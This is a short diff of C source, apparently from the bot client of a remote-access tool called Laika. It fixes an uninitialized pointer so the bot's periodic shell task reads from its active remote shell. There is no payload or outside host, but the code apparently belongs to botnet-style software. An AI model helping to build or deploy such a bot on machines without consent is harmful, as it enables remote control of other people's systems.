@@ -8,11 +8,10 @@
 struct sLaika_taskService tService;
 
 void shellTask(struct sLaika_taskService *service, struct sLaika_task *task, clock_t currTick, void *uData) {
-    struct sLaika_shell *shell;
     struct sLaika_bot *bot = (struct sLaika_bot*)uData;
 
     if (bot->shell)
-        laikaB_readShell(bot, shell);
+        laikaB_readShell(bot, bot->shell);
 }
 
 int main(int argv, char **argc) {
